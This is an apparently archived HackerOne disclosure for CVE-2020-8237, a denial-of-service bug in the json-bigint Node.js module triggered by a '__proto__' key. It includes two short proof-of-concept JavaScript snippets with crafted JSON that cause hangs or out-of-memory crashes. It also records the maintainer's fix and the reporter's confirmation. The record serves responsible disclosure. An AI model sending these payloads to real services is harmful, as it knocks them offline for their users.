---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/uncontrolled-resource-consumption
  - env/web
  - stack/node
substate: "resolved"
weakness: "Uncontrolled Resource Consumption"
enriched: true
date: 2020-08-25
submitted: 2020-07-06T07:06:56.720Z
bounty_usd: null
votes: 1
cve: "CVE-2020-8237"
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "chalker"
source: "https://hackerone.com/reports/916430"
title: "[json-bigint] DoS via `__proto__` assignment"
---
# [json-bigint] DoS via `__proto__` assignment

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 1 | **Program:** Node.js third-party modules | **Disclosed:** 2020-08-25

- Report: [https://hackerone.com/reports/916430](https://hackerone.com/reports/916430)
- CWE: Uncontrolled Resource Consumption | CVE: CVE-2020-8237
- Submitted: 2020-07-06T07:06:56.720Z

## Timeline

- **Report Filed**
- **2020-07-08** @chalker: > I contacted the maintainer to let them know

Now "Y".

Could someone add https://github.com/sidorares to the conversation, please?
- **2020-07-08** @chalker: Even shorter version for arithmetic operations:
```js
const JSONbig = require('json-bigint')
const json = '{"__proto__":1000000000000000,"c":[{}]}'
const r = JSONbig.parse(json)
r.dividedBy(42)
```
- **2020-07-08** @chalker: Another one, this is OOM:
```js
const JSONbig = require('json-bigint')
const json = '{"__proto__":1000000000000000,"e":1e23}'
const r = JSONbig.parse(json)
r.minus(1)
```
- **External User Joined**
- **2020-07-14** @sidorares: published v1.0.0 release with a fix
- **2020-08-02** @bbe8482aecd24374d13c5de15a0a6: Thanks for the update and releasing a new version with a fix @sidorares.
@chalker can you confirm that this resolves the reported issue?
- **2020-08-24** @chalker: This issue looks fixed in the security sense.
I have some questions about the fix, but those are not related to security.
This report can be closed, sorry for the delayed recheck.
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Changed Scope**
